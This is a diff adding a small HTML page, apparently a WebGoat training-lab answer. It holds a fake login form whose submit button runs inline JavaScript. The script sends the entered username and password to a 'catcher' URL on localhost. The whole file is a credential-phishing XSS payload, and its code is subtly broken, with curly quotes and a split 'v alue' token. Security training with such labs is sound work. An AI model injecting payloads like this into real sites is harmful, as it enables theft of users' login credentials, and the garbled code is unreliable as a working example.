@@ -1,0 +1,7 @@
+<html>
+    <form name = "test">
+        Username: <input type=”text” name=”username”><br> 
+        Password: <input type=”password” name=”password”><br>
+        <input type="submit" name="login" value="login" onclick="var xssImg=new Image(); xssImg.src=’http://localhost:8080/webGoat/catcher?PROPERTY=yes&user=’+this.form.username.v alue+’&password=’+this.form.password.value;">
+    </form>
+</html>
